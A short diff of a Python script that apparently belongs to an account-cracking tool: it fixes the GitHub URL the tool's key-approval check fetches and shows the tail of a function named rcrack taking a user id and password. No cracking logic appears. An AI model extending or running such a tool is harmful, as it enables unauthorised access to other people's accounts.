@@ -21,7 +21,7 @@ def NASRAT():
         to = open('/sdcard/Android/.NASRAT.txt', 'r').read()
     except (KeyError, IOError):
         NASRAT()
-    r = requests.get('https://github.com/Nasrat99799/Aprove/edit/main/Appro.txt').text
+    r = requests.get('https://github.com/Nasrat99799/Aprove/blob/main/Appro.txt').text
     if to in r:
         time.sleep(2)
         NASRAT()
@@ -496,7 +496,6 @@ def rcrack(uid,pwx,tl):
         pass
  
 NASRAT()
-
 
 
 
